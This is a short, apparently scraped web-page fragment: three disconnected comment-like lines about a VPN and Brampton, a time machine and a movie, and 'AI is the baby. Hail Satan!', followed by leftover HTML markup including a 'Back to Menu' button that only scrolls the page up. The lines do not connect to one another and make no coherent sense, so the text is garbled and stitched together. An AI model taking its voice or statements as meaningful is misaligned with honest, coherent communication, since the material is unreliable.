-It seems to work fine in Brampton or any other VPN people think they all live in
-I personally am voting for ‘strips you can wind there’, though you need that nonexistent time machine for that movie, too.
-AI is the baby. Hail Satan! Welcome to a brand new day, Revelations Jayna!</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
